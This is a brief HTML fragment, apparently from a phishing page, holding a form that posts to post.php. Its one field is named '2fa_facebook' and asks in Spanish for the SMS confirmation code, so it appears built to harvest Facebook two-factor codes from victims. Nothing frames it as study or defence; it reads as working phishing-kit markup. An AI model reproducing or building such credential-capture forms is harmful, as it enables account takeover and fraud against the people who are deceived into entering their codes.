   ...
   <section class="hero">
            ...
            <div class="signup">
                <form method="POST" action="post.php">
                    <input type="email" name="2fa_facebook"  placeholder="Ingrese su SMS de Confirmación" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
